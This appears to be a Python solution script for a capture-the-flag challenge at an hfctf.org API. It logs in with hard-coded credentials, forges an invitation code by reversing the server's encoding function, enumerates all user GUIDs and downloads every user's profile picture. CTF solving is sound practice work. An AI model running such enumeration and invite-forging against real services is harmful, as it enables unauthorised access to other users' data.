import requests, json

global api_url, paths, sess, head

doc_url = 'https://oaa.hfctf.org/doc/openapi.json'
sess = requests.session()
resp = sess.get(doc_url)
txt = resp.text

# openapi    -- Useless
# info       -- Useless
# servers    -- API url
# paths      -- YES
# components -- Could be useless or not
# security   -- Seems useless
# tags

# "tags": [
#     {
#       "name": "register", 
#       "description": "Registration"
#     },
#     {
#       "name": "user",
#       "description": "Everything related to a single user"
#     },
#     {
#       "name": "profile",
#       "description": "Profile"
#     },
#     {
#       "name": "users",
#       "description": "Everything related to multiple users"
#     },
#     {
#       "name": "auth",
#       "description": "Authentication and invitation"
#     },
#     {
#       "name": "contact",
#       "description": "Contact"
#     },
#     {
#       "name": "dev",
#       "description": "Development"
#     },
#     {
#       "name": "password",
#       "description": "Password modification"
#     },
#     {
#       "name": "promote",
#       "description": "Promotion"
#     }

def login():
	global head

	username = '123'
	password = 'Qq123456'
	url = api_url + '/api/auth/login'
	data = {'username':username, 'password':password}
	resp = sess.post(url, data=data)

	return json.loads(resp.text)['access_token']


def register(data):
	url = api_url + '/api/register'
	return json.loads(sess.post(url, data=data).text)

def current_user_data():
	url = api_url + '/api/user'

	resp = sess.get(url, headers=head)

	return json.loads(resp.text)

def promote():
	url = api_url + '/api/promote'
	data = {}

	resp = sess.post(url, data=data, headers=head)

	return json.loads(resp.text)

def users():
	url = api_url + '/api/users'
	data = {}

	resp = sess.get(url, headers=head)

	return json.loads(resp.text)

def get_dev_files():
	url = api_url + '/api/dev'
	data = {}

	resp = sess.get(url, headers=head)

	return json.loads(resp.text)

def modify(code):
	modif = ''

	for i in range(len(code)):
		c = ord(code[i])
		l = len(code)
		m = l % 10
		mod = (c + l + m - 10) % 122
		modif += chr(mod)
	return modif

def promote(UID):
	url = api_url + '/api/promote'
	data = {'username': '123'}

	resp = sess.post(url, data=data, headers=head)

	return json.loads(resp.text)

def profile(UID):
	url = api_url + f'/api/profile/{UID}'

	resp = sess.get(url, headers=head)

	return json.loads(resp.text)



def get_invited():
	url = api_url + '/api/auth/invitation'
	invite_code = 'Sio;l_Chpcn_^'


	original = invite_code
	modified = modify(invite_code)
	print(modified)
	data = {'original': original, 'modified': modified}
	resp = sess.post(url, data=data,headers=head)

	return json.loads(resp.text)

def demod(modified):
	demoded = ''

	for i in range(len(modified)):
		c = ord(modified[i])
		l = len(modified)
		m = l % 10
		mod = (c - l - m + 10) % 122
		demoded += chr(mod)

	return demoded

def entries(UID):
	url = api_url + f'/api/user/{UID}/entries'

	resp = sess.get(url, headers=head)

	return json.loads(resp.text)

def contact(message):
	url = api_url + '/api/contact'
	data = {'message': message}

	resp = sess.post(url, data=data, headers=head)

	return json.loads(resp.text)

commands = json.loads(txt)
paths = commands['paths']

api_url = commands['servers'][0]['url']
api_url = 'https://oaa.hfctf.org/'
print(api_url, '\n----------')

for key in paths:
	print(key)
print('-'*10)

token = login()
# print(token)
head = {'authorization': f'Bearer {token}'}

get_invited()

users = users()

print(current_user_data())

for user in users:
	username = user['username']
	UID = user['guid']
	print(f'{username}:{UID}')
	prof = profile(UID)
	pic = prof['picture']

	url = api_url + pic

	resp = sess.get(url, headers=head)
	imagedata = resp.content

	with open(pic[9:], 'wb') as f:
		f.write(imagedata)

	print('-'*10)


# want = 'YouAreInvited'
# invite_code = 'Sio;l_Chpcn_^'

# print(modify(code))
# print(demod(want))



